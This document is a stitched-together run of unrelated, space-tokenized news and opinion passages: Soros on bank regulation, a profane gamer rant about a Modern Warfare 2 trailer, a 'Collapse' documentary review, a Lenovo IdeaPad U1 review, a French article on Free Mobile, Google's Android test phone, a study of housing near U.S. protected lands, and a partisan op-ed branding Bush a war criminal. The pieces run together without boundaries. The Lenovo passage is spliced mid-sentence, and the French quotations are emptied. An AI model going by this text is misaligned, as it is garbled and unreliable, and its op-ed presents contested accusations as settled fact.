Without a global agreement , capital would simply move to the least regulated country .
However , if all major economies participated , they could exercise the necessary controls over money flow to prevent rogue states from circumventing the system - or stop " Goldman Sachs from setting up shop in Somalia , " as one of the participants called it .
Super bubble Mr Soros called the current economic crisis a " super bubble " that had been " generated by the system itself , " and was the culmination of 25 years of " smaller bubbles " and misguided attempts to tackle them .
These bubbles had been caused by easy credit and highly - leveraged deals , where investors borrow a multiple of their own money to finance an investment .
Both regulators and bankers had the " misconception " that markets are efficient , Mr Soros said , and had been blinded by their " ideology " of " market fundamentalism , " assuming that markets should always be lightly regulated .
Whenever a bubble burst , governments and regulators made the situation even worse by cutting interest rates and making money even cheaper - until the subprime mortgage bubble brought the whole system down , he said .
Bank profits
Mr Soros praised two UK regulators - Lord Adair Turner of the Financial Services Authority and Bank of England governor Mervyn King - for understanding the crisis and developing good policies to prevent a repeat .
With the current easy money policies , " banks are allowed to earn their way out of a hole , and they do so with astonishing rapidity , " Mr Soros said .
However , banks had made the mistake of treating these profits as if they had actually earned them themselves , and that had created a political storm that would be difficult to contain .
Mr Soros warned that politicians could easily find themselves pushed into hasty and ill - considered regulations .
It would also be wrong to impose high taxes on bank profits just yet .
" We are not out of the woods yet , " he said .
Mr Soros said it would be difficult to establish the correct ceiling for leverage that banks should have , but argued that governments had now enough time to develop a global regulatory system .
He compared any new system to Bretton Woods , the global economic system agreed at the end of World War II .
Mr Soros , a billionaire philanthropist , is most famous in the UK as the " the man who broke the Bank of England " for his role forcing the pound out of Europe 's exchange - rate mechanism in 1992 .

The latest trailer for Modern Warfare 2 , depicting a Washington under siege , was only revealed this Sunday , but it 's already raised the ire of crybabies / pot stirrers who can't handle the concept of a videogame trying something contemporary and unique with its plot .
The Christian Science Monitor does the predictable and easy thing -- invokes 9/11 like it was Godwin's Law and insinuating that no videogame should dare even think of touching that sacred and Holy event .
The article stops short of accusing Infinity Ward of " trivializing " 9/11 , but it does manage to throw in the obligatory Grand Theft Auto reference .
It also displays ignorance of the subject by completely skipping the Fallout 3 post - nuke Washington imagery .
" And with what ’s coming out of the gaming industry these days ( Grand Theft Auto IV , anyone ? ) is this any worse ?
Maybe not , " explains the writer .
" But this is one of the first times such striking imagery has surfaced since 9/11 , when the idea of widespread destruction on US soil was suddenly thrust into reality . "
Interestingly , the author of the post claims that , " Some say the images of destruction on US soil are too much for a post - 9/11 audience , " yet it provides no evidence of these mysterious criticisms and instead seems to indicate that somebody 's trying to invent a controversy .
The article also implies that showing devastation in a videogame is perfectly fine , provided it 's not American devastation .
I am mainly posting about this because I doubt this is the last we 'll hear of this issue , and I fully expect the usual unimaginative outlets to jump on this " shocking 9/11 imagery " as soon as they hear about it .
I could go on a rant about how , almost ten years on , people need to grow a set and stop being hypersensitive little bitches and screaming " 9/11 " at everything , but I 'll save that until this inevitable canned controversy kicks into overdrive .
Documentary .
Starring Michael Ruppert .
Directed by Chris Smith .
( Not rated . 82 minutes .
At Bay Area theaters . )
Michael Ruppert looks cornered in a gritty Los Angeles meat locker , ranting to an unseen documentarian and smoking as if there was no tomorrow .
And that 's exactly his belief :
There will be no tomorrow because of our alarming dependence on oil , which is about to dry up , and because our economic system has become one big pyramid scheme .
Electric cars are a smoke screen , clean coal is a joke and ethanol is an even bigger joke .
You better start saving organic seeds , because they 'll be the real currency when ( not if ) the apocalypse hits .
Ruppert may seem like a kook , but he's the Cadillac of conspiracy theorists - looking and dressing like the guy who does your taxes , while delivering his beliefs in nonpartisan assaultive bursts that defy the possibility of selfish interest .
Who would want to buy this guy 's book or visit his Web site ?
After hearing 82 minutes of Ruppert , who would want to do anything except hug the kids extra tight and start tilling whatever land you have in the backyard ?
" Collapse " has a double meaning - the collapse of society and the collapse of the film 's subject .
Shot with two cameras that circle Ruppert like vultures ( shades of Errol Morris ' " The Fog of War " ) , the former Los Angeles cop vents nonstop , interrupted only by spare video clips and the occasional semi-skeptical query from director Chris Smith .
These questions are like water on a grease fire , often sending Ruppert into frustrated fits .
It 's almost a relief when the film 's subject finally breaks down into tears .
At least he did n't have an aneurysm .
Smith , who directed the brilliant " American Movie , " has a knack for exposing the weaknesses of his subjects , while championing their nobility .
" Collapse " will leave you shaken about the future of the planet , and saddened about the shattered life of the messenger .

When closed the IdeaPad U1 Hybrid looks like a regular laptop , and with a rounded aesthetic and a red shimmery paint job it's a nice looking one .
Under the lid there 's chiclet - style keyboard surrounded by a fun rubberized palmrest with integrated touchpad .
When docked , the U1 looks and feels like any other snazzed - up laptop , with an Intel CULV processor and a 128 GB SSD running Windows 7 Home Premium .
You actually would n't know there 's a slate hiding in there -- until you pull it out and watch it switch to Lenovo 's Skylight UI , a process that was smooth and quick for us .
Lenovo says the goal is for the full switch to occur in under 3 seconds , and the U1 delivered , as far as we could tell .
The slate itself is essentially a touchscreen version of the Skylight smartbook : it runs the same Skylight OS on a similar Qualcomm Snapdragon CPU , and it seems to be pretty quick , though there 's a bit of lag in between switching windows .
( To be fair , we were playing with a super - early pre-production unit . )
The GUI is slightly different than the Skylight -- it 's built around a six - The tablet also turns into a pretty good e-reader ; we flipped to portrait it to read a preloaded PDF and the accelerometer kicked right in.w's the touch experience ?
Well , the resistive 11.6 - screen supports multitouch , ( Lenovo was n't saying where it came from ) and though it was responsive , it was far from flawless ; we had to double tap a few times to make sure our touches registered .
It 's also a little bit loose , although we expect that 'll be cleared up by the time the U1 ships .
The on - screen keyboard is big enough for entering a URL here or there , but you 're not going to want to type an email on it .
Unfortunately , the screen itself was pretty abysmal , with terrible horizontal and vertical viewing angles -- it basically disappeared at 45 degrees off axis .
That 's probably not optimal for a hand - held device , and we 're hoping Lenovo sorts that out before release .
Désormais officiellement amené à recevoir la quatrième licence 3G du paysage mobile français , le futur Free Mobile n'a pour l'instant pas révélé quelle serait la nature des forfaits qu'il lancera lorsqu'il se sera acquitté des exigences de couverture minimales .
Via l'avis d'attribution ( PDF ) publié vendredi matin par l'Arcep , on découvre toutefois quelques éléments d'information sur les offres qui accompagneront l'ouverture commerciale des services mobiles d'Iliad , via les engagements pris par l'opérateur .
Dans le lot , il est notamment fait mention d'un forfait entrée de gamme assurant plus de trois heures de communication vers les lignes fixes et mobiles en France métropolitaine pour un montant inférieur à 20 euros par mois .
Ce tarif , similaire à ce que proposent déjà certains opérateurs ou MVNO , est la seule mention chiffrée d'un éventuel tarif .
En revanche , services et conditions d'abonnement sont plus largement évoqués .
Contrairement à ce que laissaient entendre certains commentateurs , Free ne se lancera pas dans le mobile avec un forfait unique comme il l'a fait dans l'ADSL .
La décision de l'Arcep confirme que le futur opérateur mobile construira une offre graduelle basée , en ce qui concerne la voix et les services de type SMS , sur au moins trois forfaits : entrée et milieu de gamme , puis « offre d'abondance » pour une formule qui combinera vraisemblablement l'ensemble des usages mobiles , à commencer par l'accès à Internet . « » , affirme l'avis de l'Arcep .
Pour l'instant , rien ne permet de l'affirmer , mais dans la mesure où les trois acteurs déjà en place tendent à se rapprocher de ce modèle ( cf. les récents forfaits Neo3 de Bouygues Telecom ) , il n'est pas impossible que l'illimité voix et data soit devenu un standard en 2012 lorsqu' Iliad investira le marché .
L'opérateur devra donc trouver quelques arguments lui permettant de se différencier des offres déjà installées .
« » , indique l'Arcep dans sa décision .
Les limitations imposées par les opérateurs au niveau des usages en data mobile sont sans doute l'une des pistes que tentera d'explorer Free qui , selon l'Arcep , prône l'application du principe de neutralité des réseaux à l'univers mobile . « » , affirme l'Arcep , « » .
Paiement mobile par SMS ou services de type sans contact ( technologie NFC ) feraient également partie des pistes envisagées pour développer une offre attrayante .
Dès le lancement , Free proposera un forfait prépayé ainsi qu'une formule d'accès à Internet reposant sur des clés 3G .
Cette dernière présente selon l'Arcep « » . Parfois décrié dans le domaine de l'ADSL à ce sujet , Free a pris auprès de l'Arcep un engagement de qualité de service correspondant à un taux de réussite des connexions , au lancement commercial , de 96 % pour toutes les classes de service qu'il prévoit d'offrir , ce taux étant défini comme le pourcentage de connexions établies dans un délai inférieur à une minute .
C'est notamment sur ce dernier point que sera attendu le nouvel entrant .
Avec un lancement programmé pour le premier semestre 2012 , Free Mobile risque toutefois d'être amené à réviser les positions avancées dans le dossier de candidature déposé auprès de l'Arcep .
En deux ans , le marché mobile évoluera de façon sensible , et les opérateurs déjà installés prépareront sans doute une riposte adaptée aux ambitions affichées par Iliad .
Reste à voir si le consommateur en sortira bien gagnant .
Google has handed out a new mobile phone running its Android software to some employees , stirring another wave of speculation that the oft - rumored Google Phone is real .
In a blog post on Saturday morning , Google said the phones are being distributed so that workers can experiment with new mobile features .
It did not say the device will be a Google - branded phone .
But in a Twitter message earlier , a Google employee who said she has the phone r eferred to it as a " Google phone , " fuelling the latest speculation .
Since even before Google unveiled Android , onlookers wondered if the search giant would release its own phone .
Instead , it released an open source operating system that other hardware vendors can use to make phones .
In the Google blog post , Mario Queiroz , a vice president of product management , said the company gave the phone to employees as a way to test new technologies .
" We recently came up with the concept of a mobile lab , which is a device that combines innovative hardware from a partner with software that runs on Android to experiment with new mobile features and capabilities , and we shared this device with Google employees across the globe , " he wrote .
" This means they get to test out a new technology and help improve it . "
He said he could not share specific details about the product .
The post appeared to be a response to a Twitter message posted by a Google employee Friday evening , who said she had the phone .
The post , first reported by TechCrunch , sparked the new round of speculation .
" ZOMG we had fireworks and we all got the new Google phone .
It 's beautiful , " wrote Leslie Hawthorn , a program manager on Google 's open source team .
While the term " Google phone " has been used to describe a device built and branded by Google , many also use the term to refer to any phone running Android .
So it was unclear if Hawthorne was talking about a device that will be branded and sold by Google .
A podcast producer for CNET said Friday he had seen one of the phones , adding to the speculation .
The hardware is made by HTC and running Android 2.1 , the next generation of the software , Jason Howell wrote in a Twitter message .
The phones were given to employees unlocked and the one he saw was running on AT&T 's network , he said .
Because it is unlocked , workers could also choose to use T - Mobile .
" It was thin .
Dare I say as if not a bit thinner than iPhone , " he wrote .
The phone used an on - screen keyboard instead of a hardware keyboard .
He said Google was expected to reveal more details in the next few days .
Conservationists have long known that lines on a map are not sufficient to protect nature because what happens outside those boundaries can affect what happens within .
Now , a study by two University of Wisconsin - Madison scientists in the department of forest and wildlife ecology measures the threat of housing development around protected areas in the United States .
In a study published this week in the Proceedings of the National Academy of Sciences ( PNAS ) , Volker Radeloff , an associate professor , and Anna Pidgeon , an assistant professor , looked at housing around every national park , national forest and federal wilderness area in the 48 contiguous states .
Using data from the U.S. Census and local sources , they counted housing units built within 1 to 50 kilometers of these reserves , and produced maps and statistics that document the change since 1940 and project forward to 2030 .
In 2000 , 38 million housing units were within 50 kilometers of these conserved lands , compared to 9.8 million in 1940 , and housing was growing faster inside that 50 - kilometer range than outside it .
A house 's sphere of influence extends beyond its own lot , because housing can encourage the spread of invasive species , alter drainage patterns and foster increased recreational use of the conserved land , which can , ironically , harm wildlife .
Ground - nesting birds are particularly vulnerable to houses and the dogs and cats they contain , as well as to the raccoons , opossum and skunks that are attracted to residential areas , says Pidgeon .
The affected species in Wisconsin 's northern forest include the ovenbird and black and white warbler .
Many of the effects of housing are unintended , Pidgeon observes .
" People are not building houses intending to kill cougars , but that may be the effect if a cougar starts to threaten children and has to be removed . "
Migratory animals such as elk need to summer in the mountains and winter in the valleys , Pidgeon notes .
" But in the Cascades , the valleys are now filled with orchards and houses . "

Another area of concern is light pollution , Radeloff adds .
" People do n't always think about this , but a lot of wildlife species base their way - finding on the stars or the moon , and a lot of outside light can be confusing and harmful . "
The ranges under study , from 1 kilometer to 50 kilometers , were not magic numbers , says Radeloff .
" We wanted to capture the range of threats . "
In general , the closer the house , the higher the impact , he notes .
Houses within a kilometer of a preserve can be destroyed by wildfires that start inside the conserved area , " so the manager of a wilderness area might decide to fight a fire instead of letting this natural process run its course .
If the house burns , the manager might be in trouble . "
One category of development that jumped out of the data was the 940,000 housing units built between 1940 and 2000 in private land inside the boundaries of national forests .
These so - called " in-holdings " are surrounded by conserved land and therefore pose a special challenge for wildlife .
The Wisconsin scientists project that housing within 50 kilometers of wilderness areas will have grown 45 percent ( 10 million units ) by 2030 compared to 2000 .
During the same period , they project housing to grow 52 percent within 1 kilometer of national forests .
The study was supported by the Northern Research Office of the U.S. Forest Service , Radeloff says .
" They perceive housing as a big challenge for the management of national forests , because what happens right outside their boundaries is important for their future . "
As the Wisconsin scientists envision it , their new maps could be used to help local zoning groups make better decisions about land use , especially when high - value conservation land is a factor .
" If you have an important wildlife corridor , it 's important to question further density , " says Radeloff .
" It 's no secret that people like living near nature , that 's a good thing , but by building there , they may be affecting the very thing they sought out . "
Adds Pidgeon , " I was shocked to think that these protected areas are n't doing the job we believe they were doing .
There are now rings of housing around national parks like Yellowstone and Yosemite .
I do n't think it 's occurred to people to think about how that may affect biodiversity .
These parks , wilderness areas and forests are intended to protect biodiversity , so we need look at what is going on .
We are in danger of loving these protected areas to death . "
When I was a kid , John Wayne war movies gave us the message that America was the good guy , the white hat that fought the villain .
Alas , today the U.S. and its last remaining non-coerced ally , Israel , are almost universally regarded as the bad guys over whom John Wayne would triumph .
Today , the U.S. and Israel are seen throughout the world as war - criminal states .
On Aug. 23 , the BBC reported that Amnesty International has brought war crimes charges against Israel for deliberately targeting civilians and civilian infrastructure as an " integral part " of Israel ’s strategy in its recent invasion of Lebanon .
Israel claims that its aggression was " self - defense " to dislodge Hezbollah from southern Lebanon .
Yet , Israel bombed residential communities all over Lebanon , even Christian communities in the north in which no Hezbollah could possibly have been present .
United Nations spokesman Jean Fabre reported that Israel ’s attack on civilian infrastructure annihilated Lebanon ’s development : " Fifteen years of work have been wiped out in a month . "
Israel maintains that this massive destruction was unintended " collateral damage . "
President Bush maintains that Israel has " a right to protect itself " by destroying Lebanon .
Bush blocked the attempt to stop Israel ’s aggression and is , thereby , equally responsible for the war crimes .
Indeed , a number of reports claim that Bush instigated the Israeli aggression against Lebanon .
Bush has other war crime problems .
Benjamin Ferencz , a chief prosecutor of Nazi war crimes at Nuremberg , recently said that President Bush should be tried as a war criminal side - by - side with Saddam Hussein for starting aggressive wars , Hussein for his 1990 invasion of Kuwait and Bush for his 2003 invasion of Iraq .
Under the Nuremberg standard , Bush is definitely a war criminal .
The U.S. Supreme Court also exposed Bush to war crimes charges under both the U.S. War Crimes Act of 1996 and the Geneva Conventions when the Court ruled in Hamdan v. Rumsfeld against the Bush administration ’s military tribunals and inhumane treatment of detainees .
President Bush and his attorney general agree that under existing laws and treaties Bush is a war criminal together with many members of his government .
To make his war crimes legal after the fact , Bush has instructed the Justice ( sic ) Department to draft changes to the War Crimes Act and to U.S. treaty obligations under the Geneva Conventions .
One of Bush ’s changes would deny protection of the Geneva Conventions to anyone in any American court .
Bush ’s other change would protect from prosecution any U.S. government official or military personnel guilty of violating Article 3 of the Geneva Conventions .
Article 3 prohibits " at any time and in any place whatsoever outrages upon personal dignity , in particular , humiliating and degrading treatment . "
As civil libertarian Nat Hentoff observes , this change would also undo Sen. John McCain ’s amendment against torture .
Eugene Fidell , president of the National Institute of Military Justice , says that Bush ’s changes " immunize past crimes . "
Under the U.S. Constitution and U.S. legal tradition , retroactive law is impermissible .
What do Americans think of their president ’s attempts to immunize himself , his government , CIA operatives , military personnel , and civilian contractors from war crimes ?
Apparently , the self - righteous , morally superior American " Christian " public could care less .
The Republican - controlled House and Senate , which long ago traded integrity for power , are working to pass Bush ’s changes prior to the midterm elections in the event the Republicans fail to steal three elections in a row and Democrats win control of the House or Senate .
Meanwhile , the illegal war in Iraq , based entirely on Bush administration lies , grinds on , murdering and maiming ever more people .
According to the latest administration estimate , the pointless killing will go on for another 10 - 15 years .
Trouble is , there are no U.S. troops to carry on the war .
The lack of cannon fodder forces the Bush administration to resort to ever more desperate measures .
The latest is the involuntary recall of thousands of Marines from the inactive reserves to active duty .
Many attentive people regard this desperate measure as a sign that the military draft will be reinstated .
According to President Bush , the U.S. will lose the " war on terror " unless the U.S. succeeds in defeating " the Iraqi terrorists " by establishing " democracy in Iraq . "
Of course , insurgents resisting occupation are not terrorists , and there were no insurgents or terrorists in Iraq until Bush invaded .
Bush ’s unjustified invasion of Iraq and his support for Israeli aggression have done more to create terrorism in the Muslim world than Osama bin Laden could hope for .
The longer Bush occupies Iraq and the more he tries to extend U.S. / Israeli hegemony in the Middle East , the more terrorism the world will suffer .
Bush and the neocon ideology that holds him captive are the greatest 21st - century threats to peace and stability .
The neoconized Bush regime invented the war on terror , lost it , and now is bringing terror home to the American people .
